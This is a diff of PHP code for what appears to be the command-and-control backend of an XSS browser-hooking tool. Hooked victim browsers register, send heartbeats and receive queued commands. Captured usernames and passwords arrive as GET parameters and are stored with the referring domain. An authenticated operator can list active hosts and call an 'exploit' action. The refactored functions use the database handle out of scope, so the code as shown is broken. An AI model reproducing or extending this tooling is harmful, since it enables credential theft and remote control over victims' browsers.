@@ -101,12 +101,53 @@ function run_commands($db, $guid) {
 	}
 }
 
+function do_heartbeat() {
+	$log = Logger::getLogger("heartbeat");
+
+	// which host?
+	$host = $db->select("get host", "SELECT * FROM host", array("guid" => $_GET['id']));
+
+	// ensure we have a host
+	if (!isset($host[0])) {
+		$log->error("NO SUCH HOST!");
+		$id = create_host($db, $_GET['id'], "null");
+		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $id));
+	}
+	// update the heqartbeat time.   TODO: web scale this shiz!
+	else {
+		$db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $_GET['id']));
+		// add debug log
+		if (isset($_GET['d']) && strlen($_GET['d']) > 1) { $db->insert("log debug", "debug_log", array("guid" => $_GET['id'], "log" => $_GET['d'])); }
+		run_commands($db, $_GET['id']);
+		exit;
+	}
+
+	// do we have creds ?
+	// todo: move this to a module
+	if (isset($_GET['u'])) {
+		$id = $db->insert("create auth", "auth", array('id' => null, 'host_id' => $host[0]['id'], 'domain' => $_SERVER['HTTP_REFERER'], 
+			'user' => $_GET['u'], 'pass' => $_GET['p']));
+	}
+}
+
+function list_hosts() {
+	$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
+	$rows2 = $db->select("get hosts", "SELECT *, 'inactive' as class FROM host", array("heartbeat < " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
+
+	//print_r($rows);
+	echo "host_list = " . json_encode(array_merge($rows, $rows2)) . ";\n";
+	echo "update_list(); xsscls();";
+}
 
 try {
 	// TODO: use localcache so we don't need a DB connection unless writing
 	// we will need a db connection
 	$db = DB::getConnection(DB_HOST, DB_USER, DB_PASS, DB_NAME);
 
+
+	/******************
+	 * PUBLIC METHODS
+	 *****************/
 	// register new hosts
 	if (isset($_GET['reg'])) {
 		create_host($db, $_GET['reg'], ($_GET['c']) ? $_GET['c'] : "null");
@@ -120,59 +161,31 @@ try {
 
 	// heart beats. debug logs. command execution
 	if (isset($_GET['id'])) {
-		// which host?
-		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $_GET['id']));
-		// TODO: send register command!
-		if (!isset($host[0])) {
-			$log->error("NO SUCH HOST!");
-			$id = create_host($db, $_GET['id'], "null");
-			// $id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $_SERVER['HTTP_USER_AGENT'], 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => null, 'guid' => $_GET['id']));
-			$host = $db->select("get host", "SELECT * FROM host", array("guid" => $id));
-		}
-		else {
-			$db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $_GET['id']));
-			// add debug log
-			if (isset($_GET['d']) && strlen($_GET['d']) > 1) { $db->insert("log debug", "debug_log", array("guid" => $_GET['id'], "log" => $_GET['d'])); }
-			run_commands($db, $_GET['id']);
-			exit;
-		}
-
-		// do we have creds ?
-		if (isset($_GET['u'])) {
-			$id = $db->insert("create auth", "auth", array('id' => null, 'host_id' => $host[0]['id'], 'domain' => $_SERVER['HTTP_REFERER'], 
-				'user' => $_GET['u'], 'pass' => $_GET['p']));
-		}
+		do_heartbeat();
 	}
+
+	/******************
+	 * PRIVATE METHODS
+	 *****************/
+	if (!isset($_GET["A"]))
+		die("no action");
 
 	if ($_GET['auth'] != PASSWORD) {
 		$log->error("incorrect auth [ " . $_GET['auth'] . "]");
 		die("require auth");
 	}
 
+	// create an array with all of the parameters
 	$data = array();
 	foreach ($_GET as $param => $value) {
 		if ($param != "A" && $param != 'auth' && $param != 'table')
 			$data[$param] = $value;
 	}
 
-	if (!isset($_GET["A"]))
-		die("no action");
 
-	if ($_GET["A"] == "insert") {
-		$data = array();
-		foreach ($_GET as $param => $value) {
-			if ($param != "A" && $param != 'auth' && $param != 'table')
-				$data[$param] = $value;
-		}
-		$db->insert($_GET['name'], $_GET['table'], $data, $force = false);
-	}
 
 	if ($_GET["A"] == "list") {
-		$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
-		$rows2 = $db->select("get hosts", "SELECT *, 'inactive' as class FROM host", array("heartbeat < " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
-		//print_r($rows);
-		echo "host_list = " . json_encode(array_merge($rows, $rows2)) . ";\n";
-		echo "update_list(); xsscls();";
+		list_hosts();
 	}
 
 	if ($_GET["A"] == "exploit") { 
